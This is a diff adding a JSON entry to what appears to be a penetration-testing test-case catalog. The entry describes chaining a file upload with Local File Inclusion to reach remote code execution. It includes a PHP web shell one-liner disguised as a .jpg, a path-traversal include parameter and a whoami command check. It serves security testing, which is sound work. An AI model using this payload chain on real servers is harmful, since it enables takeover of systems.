@@ -1,0 +1,10 @@
+{
+    "key": "HACK-090",
+    "summary": "Chaining File Upload to LFI for RCE",
+    "description": "Upload a file containing web shell code, then use a Local File Inclusion vulnerability to have the server execute the uploaded file.",
+    "category": "Chained Exploit",
+    "severity": "Critical",
+    "testing_type": "Penetration Test",
+    "target": "File upload and file inclusion functionality",
+    "instructions": "1. Pre-requisite: A file upload vulnerability and an LFI vulnerability.\n2. Upload a file with a benign extension (e.g., `.jpg`) but containing PHP shell code: `<?php system($_GET['cmd']); ?>`. Note the path where the file is stored (e.g., `/var/www/uploads/shell.jpg`).\n3. Use the LFI vulnerability to include this file: `?page=../../var/www/uploads/shell.jpg`.\n4. If the server's PHP engine parses the `.jpg` file, the shell will execute. Add `&cmd=whoami` to the URL to confirm RCE."
+}
